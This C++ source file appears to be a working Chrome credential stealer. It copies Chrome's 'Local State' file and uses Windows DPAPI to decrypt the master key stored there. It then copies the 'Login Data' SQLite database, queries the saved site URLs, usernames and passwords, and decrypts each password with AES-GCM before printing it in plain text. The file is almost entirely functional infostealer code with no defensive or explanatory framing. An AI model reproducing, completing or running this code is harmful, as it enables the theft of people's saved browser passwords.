// cookieVS.cpp : Defines the entry point for the application.
//

#include "test.h"
using namespace std;
string MASTER;
DATA_BLOB out;
//int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
//{
    /*int control = MessageBoxA(nullptr, "Wanna open the file?", "Open File", MB_YESNO);
    char data[100];
    if (control == IDYES)
    {
        HANDLE handle = CreateFileA("C:\\Users\\admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (handle == nullptr) return GetLastError();
        DWORD charRead;
        ReadFile(handle, (PVOID)data, 100, &charRead, NULL);
        MessageBoxA(NULL,hello, "File content", MB_OK);
    }
    return 0;*/

string decrypt(BYTE* txt)
{
    string rpdata;
    try
    {
        string data{ (char*)txt };
        DATA_BLOB in{ data.length(), txt };
        DATA_BLOB out;
        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) return string{ (char*)out.pbData };
    }
    catch (exception e)
    {
        cout << e.what();
    }

    try
    {
    CryptoPP::SecByteBlock key(out.cbData);
    CryptoPP::SecByteBlock iv(12);
    memcpy(key, out.pbData, out.cbData);
    memcpy(iv, txt + 3, 12);
    CryptoPP::GCM<CryptoPP::AES>::Decryption gcmDecrypt;
    gcmDecrypt.SetKeyWithIV(key, 32, iv, 12);
    string cipher = string((char*)txt).substr(15);
    CryptoPP::AuthenticatedDecryptionFilter df(gcmDecrypt, new CryptoPP::StringSink(rpdata));
    CryptoPP::StringSource source(cipher, true, new CryptoPP::Redirector(df));
    //cout << rpdata << endl;
    return rpdata;
    }
    catch (exception& e)
    {
        //cerr << rpdata << endl;
        cerr << e.what() << endl;
        return "Can't decrypt";
    }

}

int callback(void* notUsed, int argc, char** argv, char** azColName)
{
    for (int i = 0; i < argc; i++)
    {
        string txt = argv[i] ? argv[i] : "NULL";
        string col = azColName[i];
        if (col == "password_value") txt = decrypt((BYTE*)txt.c_str());
        cout << azColName[i] << ": " << txt << endl;
    }
    return 0;
}

int test() {
    CopyFile("C:\\Users\\admin\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "Local State", false);
    ifstream ifs("Local State");
    nlohmann::json jf = nlohmann::json::parse(ifs);
    string key = jf["os_crypt"]["encrypted_key"].get<string>();
    string trueKey;
    macaron::Base64::Decode(key, trueKey);
    trueKey = trueKey.substr(5);
    //cout << trueKey << endl;
    DATA_BLOB input{trueKey.length(), (BYTE*)trueKey.c_str()};
 
    if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &out))
    {
        cout << GetLastError() << endl;
        return 1;
    }
    cout << out.cbData << endl;


    CopyFileA("C:\\Users\\admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "Login Data", false);
 sqlite3* db;
 int status = sqlite3_open("Login Data", &db);

 if (status) {
     cerr << "Can't open database: " << sqlite3_errcode(db);
     return (0);
 }
 string query = "SELECT origin_url,username_value, password_value FROM logins";
 char* error;
 status = sqlite3_exec(db, query.c_str(), callback, 0, &error);
 if (status != SQLITE_OK)
 {
     cout << "Error: " << error << endl;
     return 1;
 }
 else
 {
     cout << "Success" << endl;
 }
 return 0;
    }
